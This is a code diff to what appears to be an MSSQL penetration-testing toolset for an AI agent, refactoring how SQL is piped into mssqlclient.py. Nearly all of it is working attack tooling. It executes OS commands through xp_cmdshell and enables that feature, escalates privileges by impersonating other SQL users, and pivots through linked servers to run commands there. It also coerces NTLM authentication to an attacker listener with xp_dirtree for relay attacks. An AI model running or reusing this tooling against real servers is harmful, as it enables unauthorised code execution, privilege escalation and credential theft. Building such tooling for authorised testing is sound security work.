@@ -1138,6 +1138,37 @@ class MSSQLTools(Toolset):
         """Set the operation state for this toolset."""
         self.state = state
 
+    @staticmethod
+    def _mssql_connect_args(
+        target: str,
+        username: str,
+        password: str,
+        domain: str | None = None,
+        windows_auth: bool = True,
+        port: int | None = None,
+    ) -> str:
+        """Build mssqlclient.py connection arguments."""
+        if domain:
+            args = f"mssqlclient.py {domain}/{username}:{password}@{target}"
+        else:
+            args = f"mssqlclient.py {username}:{password}@{target}"
+        if windows_auth:
+            args += " -windows-auth"
+        if port and port != 1433:
+            args += f" -port {port}"
+        return args
+
+    @staticmethod
+    def _mssql_pipe_cmd(sql: str, connect_args: str) -> str:
+        """Build a shell command that pipes SQL into mssqlclient.py and exits cleanly.
+
+        mssqlclient.py's interactive shell loops forever when stdin runs out
+        (tries to execute 'EOF' as a stored procedure). Appending 'exit' to
+        the piped input forces a clean shutdown.
+        """
+        # Use heredoc to avoid all quoting/escaping issues with SQL content
+        return f"cat <<'MSSQL_EOF' | {connect_args}\n{sql}\nexit\nMSSQL_EOF"
+
     @dn.tool_method
     def mssql_command(
         self,
@@ -1147,6 +1178,7 @@ class MSSQLTools(Toolset):
         command: str,
         domain: str | None = None,
         windows_auth: bool = True,
+        port: int | None = None,
     ) -> str:
         """
         Execute commands on MSSQL server via xp_cmdshell.
@@ -1161,6 +1193,7 @@ class MSSQLTools(Toolset):
             command: System command to execute
             domain: Domain for Windows auth (optional)
             windows_auth: Use Windows authentication (default: True)
+            port: MSSQL port (default: 1433, use for named instances on non-standard ports)
 
         Returns:
             Command output from the target system
@@ -1168,15 +1201,10 @@ class MSSQLTools(Toolset):
         Example:
             >>> mssql_command("192.168.58.22", "sa", "password", "whoami", windows_auth=False)  # pragma: allowlist secret
         """
-        if domain:
-            target_string = f"{domain}/{username}:{password}@{target}"
-        else:
-            target_string = f"{username}:{password}@{target}"
+        connect = self._mssql_connect_args(target, username, password, domain, windows_auth, port)
 
         # nosec B608 - intentional command execution for MSSQL pentest
-        cmd_string = f"echo \"xp_cmdshell '{command}'\" | mssqlclient.py {target_string}"
-        if windows_auth:
-            cmd_string += " -windows-auth"
+        cmd_string = self._mssql_pipe_cmd(f"xp_cmdshell '{command}'", connect)
 
         try:
             logger.info(f"[*] Executing command on MSSQL: {command}")
@@ -1194,6 +1222,7 @@ class MSSQLTools(Toolset):
         password: str,
         domain: str | None = None,
         windows_auth: bool = True,
+        port: int | None = None,
     ) -> str:
         """
         Enable xp_cmdshell on an MSSQL server for command execution.
@@ -1207,6 +1236,7 @@ class MSSQLTools(Toolset):
             password: Password for authentication
             domain: Domain for Windows auth (optional)
             windows_auth: Use Windows authentication (default: True)
+            port: MSSQL port (default: 1433, use for named instances on non-standard ports)
 
         Returns:
             xp_cmdshell enablement result
@@ -1214,21 +1244,16 @@ class MSSQLTools(Toolset):
         Example:
             >>> mssql_enable_xp_cmdshell("192.168.58.22", "user", "pass", "contoso.local")
         """
-        if domain:
-            target_string = f"{domain}/{username}:{password}@{target}"
-        else:
-            target_string = f"{username}:{password}@{target}"
+        connect = self._mssql_connect_args(target, username, password, domain, windows_auth, port)
 
         # nosec B608 - intentional SQL for MSSQL pentest
-        enable_commands = """
-sp_configure 'show advanced options', 1;
-RECONFIGURE;
-sp_configure 'xp_cmdshell', 1;
-RECONFIGURE;
-"""
-        cmd_string = f'echo "{enable_commands}" | mssqlclient.py {target_string}'
-        if windows_auth:
-            cmd_string += " -windows-auth"
+        enable_commands = (
+            "sp_configure 'show advanced options', 1;\n"
+            "RECONFIGURE;\n"
+            "sp_configure 'xp_cmdshell', 1;\n"
+            "RECONFIGURE;"
+        )
+        cmd_string = self._mssql_pipe_cmd(enable_commands, connect)
 
         try:
             logger.info(f"[*] Enabling xp_cmdshell on {target}")
@@ -1256,6 +1281,7 @@ RECONFIGURE;
         password: str,
         domain: str | None = None,
         windows_auth: bool = True,
+        port: int | None = None,
     ) -> str:
         """
         Enumerate MSSQL users that can be impersonated for privilege escalation.
@@ -1270,6 +1296,7 @@ RECONFIGURE;
             password: Password for authentication
             domain: Domain for Windows auth (optional)
             windows_auth: Use Windows authentication
+            port: MSSQL port (default: 1433, use for named instances on non-standard ports)
 
         Returns:
             List of users that can be impersonated
@@ -1277,21 +1304,16 @@ RECONFIGURE;
         Example:
             >>> mssql_enum_impersonation("192.168.58.22", "user", "pass", "contoso.local")
         """
-        if domain:
-            target_string = f"{domain}/{username}:{password}@{target}"
-        else:
-            target_string = f"{username}:{password}@{target}"
+        connect = self._mssql_connect_args(target, username, password, domain, windows_auth, port)
 
         # nosec B608 - intentional SQL for MSSQL pentest recon
-        sql_query = """
-SELECT DISTINCT b.name AS 'ImpersonatableUser'
-FROM sys.server_permissions a
-INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
-WHERE a.permission_name = 'IMPERSONATE';
-"""
-        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
-        if windows_auth:
-            cmd_string += " -windows-auth"
+        sql_query = (
+            "SELECT DISTINCT b.name AS 'ImpersonatableUser' "
+            "FROM sys.server_permissions a "
+            "INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id "
+            "WHERE a.permission_name = 'IMPERSONATE';"
+        )
+        cmd_string = self._mssql_pipe_cmd(sql_query, connect)
 
         try:
             logger.info(f"[*] Enumerating impersonation rights on {target}")
@@ -1361,6 +1383,7 @@ WHERE a.permission_name = 'IMPERSONATE';
         domain: str | None = None,
         windows_auth: bool = True,
         database: str | None = None,
+        port: int | None = None,
     ) -> str:
         """
         Impersonate another SQL user for privilege escalation.
@@ -1379,6 +1402,7 @@ WHERE a.permission_name = 'IMPERSONATE';
             domain: Domain for Windows auth (optional)
             windows_auth: Use Windows authentication
             database: Target database for impersonation (optional)
+            port: MSSQL port (default: 1433, use for named instances on non-standard ports)
 
         Returns:
             Query result executed as the impersonated user
@@ -1387,10 +1411,7 @@ WHERE a.permission_name = 'IMPERSONATE';
             >>> mssql_enum_impersonation("192.168.58.22", "user", "pass", "contoso.local")  # First enumerate
             >>> mssql_impersonate("192.168.58.22", "user", "pass", "sa", "SELECT SYSTEM_USER", "contoso.local")
         """
-        if domain:
-            target_string = f"{domain}/{username}:{password}@{target}"
-        else:
-            target_string = f"{username}:{password}@{target}"
+        connect = self._mssql_connect_args(target, username, password, domain, windows_auth, port)
 
         sql_commands = []
         if database:
@@ -1398,11 +1419,9 @@ WHERE a.permission_name = 'IMPERSONATE';
         sql_commands.append(f"EXECUTE AS USER = '{impersonate_user}';")
         sql_commands.append(query)
         sql_commands.append("REVERT;")
-        sql_script = " ".join(sql_commands)
+        sql_script = "\n".join(sql_commands)
 
-        cmd_string = f'echo "{sql_script}" | mssqlclient.py {target_string}'
-        if windows_auth:
-            cmd_string += " -windows-auth"
+        cmd_string = self._mssql_pipe_cmd(sql_script, connect)
 
         try:
             logger.info(
@@ -1422,6 +1441,7 @@ WHERE a.permission_name = 'IMPERSONATE';
         password: str,
         domain: str | None = None,
         windows_auth: bool = True,
+        port: int | None = None,
     ) -> str:
         """
         Enumerate MSSQL linked servers for cross-server pivoting.
@@ -1435,6 +1455,7 @@ WHERE a.permission_name = 'IMPERSONATE';
             password: Password for authentication
             domain: Domain for Windows auth
             windows_auth: Use Windows authentication
+            port: MSSQL port (default: 1433, use for named instances on non-standard ports)
 
         Returns:
             List of linked servers with access information
@@ -1442,19 +1463,14 @@ WHERE a.permission_name = 'IMPERSONATE';
         Example:
             >>> mssql_enum_linked_servers("192.168.58.22", "user", "pass", "contoso.local")
         """
-        if domain:
-            target_string = f"{domain}/{username}:{password}@{target}"
-        else:
-            target_string = f"{username}:{password}@{target}"
+        connect = self._mssql_connect_args(target, username, password, domain, windows_auth, port)
 
         # nosec B608 - intentional SQL for MSSQL pentest recon
-        sql_query = """
-SELECT name, data_source, provider FROM sys.servers WHERE is_linked = 1;
-EXEC sp_linkedservers;
-"""
-        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
-        if windows_auth:
-            cmd_string += " -windows-auth"
+        sql_query = (
+            "SELECT name, data_source, provider FROM sys.servers WHERE is_linked = 1;\n"
+            "EXEC sp_linkedservers;"
+        )
+        cmd_string = self._mssql_pipe_cmd(sql_query, connect)
 
         try:
             logger.info(f"[*] Enumerating linked servers on {target}")
@@ -1485,6 +1501,7 @@ EXEC sp_linkedservers;
         query: str,
         domain: str | None = None,
         windows_auth: bool = True,
+        port: int | None = None,
     ) -> str:
         """
         Execute query on a linked MSSQL server (cross-server pivoting).
@@ -1500,6 +1517,7 @@ EXEC sp_linkedservers;
             query: SQL query to execute (or 'xp_cmdshell ''command''')
             domain: Domain for Windows auth
             windows_auth: Use Windows authentication
+            port: MSSQL port (default: 1433, use for named instances on non-standard ports)
 
         Returns:
             Query result from the linked server
@@ -1508,17 +1526,14 @@ EXEC sp_linkedservers;
             >>> mssql_exec_linked("192.168.58.22", "user", "pass", "LINKED_SRV", "SELECT SYSTEM_USER", "contoso.local")
             >>> mssql_exec_linked("192.168.58.22", "user", "pass", "LINKED_SRV", "EXEC xp_cmdshell 'whoami'", "contoso.local")
         """
-        if domain:
-            target_string = f"{domain}/{username}:{password}@{target}"
-        else:
-            target_string = f"{username}:{password}@{target}"
+        connect = self._mssql_connect_args(target, username, password, domain, windows_auth, port)
 
         # nosec B608 - intentional SQL for MSSQL pentest recon
-        sql_query = f"EXEC ('{query}') AT [{linked_server}];"
+        # Escape single quotes for T-SQL EXEC('...') wrapper — double them
+        escaped_query = query.replace("'", "''")
+        sql_query = f"EXEC ('{escaped_query}') AT [{linked_server}];"
 
-        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
-        if windows_auth:
-            cmd_string += " -windows-auth"
+        cmd_string = self._mssql_pipe_cmd(sql_query, connect)
 
         try:
             logger.info(f"[*] Executing query on linked server {linked_server}")
@@ -1548,6 +1563,7 @@ EXEC sp_linkedservers;
         listener_ip: str,
         domain: str | None = None,
         windows_auth: bool = True,
+        port: int | None = None,
     ) -> str:
         """
         Coerce NTLM authentication from MSSQL server for relay attacks.
@@ -1562,6 +1578,7 @@ EXEC sp_linkedservers;
             listener_ip: Your listener IP (running Responder/ntlmrelayx)
             domain: Domain for Windows auth
             windows_auth: Use Windows authentication
+            port: MSSQL port (default: 1433, use for named instances on non-standard ports)
 
         Returns:
             Coercion attempt result
@@ -1569,17 +1586,12 @@ EXEC sp_linkedservers;
         Example:
             >>> mssql_ntlm_coerce("192.168.58.22", "user", "pass", "192.168.58.100", "contoso.local")
         """
-        if domain:
-            target_string = f"{domain}/{username}:{password}@{target}"
-        else:
-            target_string = f"{username}:{password}@{target}"
+        connect = self._mssql_connect_args(target, username, password, domain, windows_auth, port)
 
         # nosec B608 - intentional SQL for MSSQL pentest
-        sql_query = f"EXEC xp_dirtree '\\\\\\\\{listener_ip}\\\\share';"
+        sql_query = f"EXEC xp_dirtree '\\\\{listener_ip}\\share';"
 
-        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
-        if windows_auth:
-            cmd_string += " -windows-auth"
+        cmd_string = self._mssql_pipe_cmd(sql_query, connect)
 
         try:
             logger.info(f"[*] Coercing NTLM auth from {target} to {listener_ip}")
@@ -1606,6 +1618,7 @@ EXEC sp_linkedservers;
         linked_server: str,
         domain: str | None = None,
         windows_auth: bool = True,
+        port: int | None = None,
     ) -> str:
         """
         Enable xp_cmdshell on a linked MSSQL server for command execution.
@@ -1623,6 +1636,7 @@ EXEC sp_linkedservers;
             linked_server: Name of the linked server to enable xp_cmdshell on
             domain: Domain for Windows auth (optional)
             windows_auth: Use Windows authentication (default: True)
+            port: MSSQL port (default: 1433, use for named instances on non-standard ports)
 
         Returns:
             xp_cmdshell enablement result on the linked server
@@ -1630,31 +1644,21 @@ EXEC sp_linkedservers;
         Example:
             >>> mssql_linked_enable_xpcmdshell("192.168.58.22", "user", "pass", "SQL01", "contoso.local")
         """
-        if domain:
-            target_string = f"{domain}/{username}:{password}@{target}"
-        else:
-            target_string = f"{username}:{password}@{target}"
+        connect = self._mssql_connect_args(target, username, password, domain, windows_auth, port)
 
         # nosec B608 - intentional SQL for MSSQL pentest
         # Enable show advanced options and xp_cmdshell on the linked server
-        enable_queries = [
-            f"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [{linked_server}]",
-            f"EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linked_server}]",
-        ]
+        sql = (
+            f"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [{linked_server}]\n"
+            f"EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linked_server}]"
+        )
+        cmd_string = self._mssql_pipe_cmd(sql, connect)
 
-        results = []
-        for sql_query in enable_queries:
-            cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
-            if windows_auth:
-                cmd_string += " -windows-auth"
-
-            try:
-                stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)
-                results.append(stdout + "\n" + (stderr or ""))
-            except Exception as e:
-                results.append(f"Error: {e}")
-
-        combined_result = "\n".join(results)
+        try:
+            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)
+            combined_result = stdout + "\n" + (stderr or "")
+        except Exception as e:
+            combined_result = f"Error: {e}"
 
         if (
             "configuration option" in combined_result.lower()
@@ -1683,6 +1687,7 @@ EXEC sp_linkedservers;
         command: str,
         domain: str | None = None,
         windows_auth: bool = True,
+        port: int | None = None,
     ) -> str:
         """
         Execute OS command via xp_cmdshell on a linked MSSQL server.
@@ -1698,6 +1703,7 @@ EXEC sp_linkedservers;
             command: OS command to execute on the linked server
             domain: Domain for Windows auth (optional)
             windows_auth: Use Windows authentication (default: True)
+            port: MSSQL port (default: 1433, use for named instances on non-standard ports)
 
         Returns:
             Command output from the linked server
@@ -1706,10 +1712,7 @@ EXEC sp_linkedservers;
             >>> mssql_linked_xpcmdshell("192.168.58.22", "user", "pass", "SQL01", "whoami", "contoso.local")
             >>> mssql_linked_xpcmdshell("192.168.58.22", "user", "pass", "SQL01", "hostname && ipconfig", "contoso.local")
         """
-        if domain:
-            target_string = f"{domain}/{username}:{password}@{target}"
-        else:
-            target_string = f"{username}:{password}@{target}"
+        connect = self._mssql_connect_args(target, username, password, domain, windows_auth, port)
 
         # Escape single quotes in command for SQL
         escaped_command = command.replace("'", "''")
@@ -1717,9 +1720,7 @@ EXEC sp_linkedservers;
         # nosec B608 - intentional SQL for MSSQL pentest
         sql_query = f"EXEC ('xp_cmdshell ''{escaped_command}''') AT [{linked_server}]"
 
-        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
-        if windows_auth:
-            cmd_string += " -windows-auth"
+        cmd_string = self._mssql_pipe_cmd(sql_query, connect)
 
         try:
             logger.info(f"[*] Executing command on linked server {linked_server}: {command}")
